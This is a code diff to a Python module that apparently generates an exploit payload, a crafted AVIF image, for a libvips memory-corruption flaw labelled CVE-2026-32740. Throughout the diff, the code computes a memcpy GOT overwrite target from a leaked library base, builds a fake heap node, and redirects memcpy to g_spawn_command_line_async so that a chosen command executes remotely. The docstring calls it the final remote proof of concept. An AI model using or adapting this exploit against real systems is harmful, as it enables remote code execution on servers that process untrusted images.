@@ -1,9 +1,9 @@
 #!/usr/bin/env python3
-"""Generate the proven CVE-2026-32740 memcpy-GOT payload.
+"""Generate the CVE-2026-32740 libvips-relative GOT payload.
 
 This module intentionally contains only the chain used by the final remote
-PoC.  Earlier BSS, vtable and rb-tree-GOT experiments are not part of the
-published exploit.
+PoC. Earlier BSS, vtable, Node-loader, and rb-tree-GOT experiments are not
+part of the published exploit.
 """
 
 from __future__ import annotations
@@ -11,6 +11,7 @@ from __future__ import annotations
 import struct
 
 from avif_grid import build_grid_avif
+from control_target import derive_control_target
 from stack_profile import NativeStackProfile, load_profile
 
 
@@ -42,19 +43,29 @@ def _fake_plane_node(write_target: int,
 
 def build_rce_payload(libvips_base: int,
                       fake_node_low16: int,
-                      library_path: str | None = None,
+                      control_target: int,
+                      command: str | None = None,
                       profile: NativeStackProfile | None = None) -> bytes:
-    """Build one runtime-specific AVIF from the remotely leaked DSO base."""
+    """Build one AVIF from the remotely derived DSO and heap addresses."""
     selected = profile or load_profile()
     payload = selected.payload
-    remote_path = library_path or selected.application.library_path
-    encoded_path = remote_path.encode("ascii") + b"\x00"
-    if len(encoded_path) > payload.path_field_bytes:
+    expected_target = derive_control_target(libvips_base, selected)
+    if control_target != expected_target.address:
         raise ValueError(
-            "library_path exceeds the selected profile's path field",
+            "control target does not match the selected libvips base and profile",
         )
-    if libvips_base & (selected.libvips.leak.base_alignment - 1):
-        raise ValueError("libvips base is not page-aligned")
+    payload_command = command or (
+        f"{selected.application.command_executable} "
+        f"{selected.application.script_path}"
+    )
+    try:
+        encoded_command = payload_command.encode("ascii") + b"\x00"
+    except UnicodeEncodeError as error:
+        raise ValueError("payload command must be ASCII") from error
+    if len(encoded_command) > payload.command_field_bytes:
+        raise ValueError(
+            "payload command exceeds the selected profile's command field",
+        )
     if (
         isinstance(fake_node_low16, bool)
         or not isinstance(fake_node_low16, int)
@@ -63,19 +74,21 @@ def build_rce_payload(libvips_base: int,
         raise ValueError("fake-node selector must fit an unsigned two-byte value")
 
     # The first chosen-address memcpy starts at the profile's backoff before
-    # memcpy@GOT. Its source row contains the path field followed by
-    # unixDlOpen, replacing
-    # the GOT slot.  The next row calls the replacement with RSI pointing to
-    # the same path prefix.
+    # memcpy@GOT. Its source row stores the command at RDI and replaces the GOT
+    # slot with a libvips-relative g_spawn_command_line_async address. The next
+    # row calls that helper; a zero source row also gives its GError ** argument
+    # readable zero storage in RSI.
     write_target = (
         libvips_base
         + selected.libvips.memcpy_got_offset
         - payload.write_target_backoff
     )
-    row = encoded_path.ljust(payload.path_field_bytes, b"\x00")
-    row += struct.pack("<Q", selected.node.unix_dl_open_address)
+    row = encoded_command.ljust(payload.command_field_bytes, b"\x00")
+    row += struct.pack("<Q", control_target)
     row += bytes(payload.chroma_width - len(row))
-    write_data = row * payload.chroma_height
+    write_data = row + bytes(
+        payload.chroma_width * (payload.chroma_height - 1),
+    )
     node = _fake_plane_node(write_target, selected)
     root_chunk_header = struct.pack(
         "<QQ", 0, selected.glibc.root_chunk_size_and_flags,
